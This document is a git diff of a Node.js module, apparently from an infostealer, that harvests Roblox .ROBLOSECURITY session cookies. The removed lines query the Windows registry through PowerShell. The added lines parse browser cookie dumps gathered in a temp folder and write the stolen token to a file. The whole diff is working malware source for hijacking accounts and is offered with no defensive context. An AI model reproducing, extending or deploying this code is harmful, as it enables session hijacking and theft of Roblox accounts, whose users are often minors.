@@ -1,15 +1,15 @@
 const { join } = require('path');
 const fs = require('fs');
-const { spawnSync } = require('child_process');
 const { tempFolder } = require('../index');
+const { searchForFile } = require('../util/dir');
 
-const subprocess = (path) => {
-  return spawnSync('powershell', [`Get-ItemPropertyValue -Path ${path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY`]).stdout.toString();
-};
-
-let regCookie = subprocess('HKLM');
-const cookies = [];
-!regCookie ? regCookie = subprocess('HKCU') : cookies.push(regCookie);
-if (cookies.length !== 0) {
-  fs.writeFileSync(join(tempFolder, 'Roblox Cookies.txt'), cookies.join('\n'));
-}
+fs.readdirSync(join(tempFolder, 'Browsers'))?.filter(f => f.split('.').length >= 1)?.forEach(async browser => {
+  const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
+  await searchForFile(file, 500);
+  const line = fs.readFileSync(file)
+    .toString().split('\n')
+    .find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
+  if (!line) return;
+  const cookie = line.split(',')[2];
+  fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
+});
